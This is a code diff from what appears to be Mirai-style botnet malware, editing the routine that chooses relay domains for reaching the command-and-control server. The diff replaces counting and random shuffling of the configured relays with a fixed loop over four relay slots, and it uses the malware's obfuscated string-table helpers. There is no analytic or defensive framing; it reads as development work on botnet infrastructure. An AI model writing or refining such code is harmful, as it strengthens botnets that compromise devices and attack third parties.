@@ -47,41 +47,10 @@ static void resolve_relay_addr(void)
 {
     srv_addr.sin_family = AF_INET;
 
-    // Try all available relays in random order until one works
-    int relay_order[4] = {0, 1, 2, 3};
-    int configured_relays = 0;
-    
-    // First, count how many relays are actually configured
-    for (int i = 0; i < 4; i++)
+    // Try all 4 possible relay slots
+    for (int attempt = 0; attempt < 4; attempt++)
     {
-        int idx = TABLE_RELAY_1 + i;
-        table_unlock_val(idx);
-        char *domain = table_retrieve_val(idx, NULL);
-        if (domain != NULL && util_strlen(domain) > 0)
-            configured_relays++;
-        table_lock_val(idx);
-    }
-    
-    if (configured_relays == 0)
-    {
-#ifdef DEBUG
-        printf("[relay] No relays configured, falling back to CNC direct\n");
-#endif
-        return;
-    }
-    
-    // Shuffle the relay order
-    for (int i = configured_relays - 1; i > 0; i--)
-    {
-        int j = rand_next() % (i + 1);
-        int tmp = relay_order[i];
-        relay_order[i] = relay_order[j];
-        relay_order[j] = tmp;
-    }
-    
-    for (int attempt = 0; attempt < configured_relays; attempt++)
-    {
-        int relay_index = TABLE_RELAY_1 + relay_order[attempt];
+        int relay_index = TABLE_RELAY_1 + attempt;
         table_unlock_val(relay_index);
         char *relay_domain = table_retrieve_val(relay_index, NULL);
         
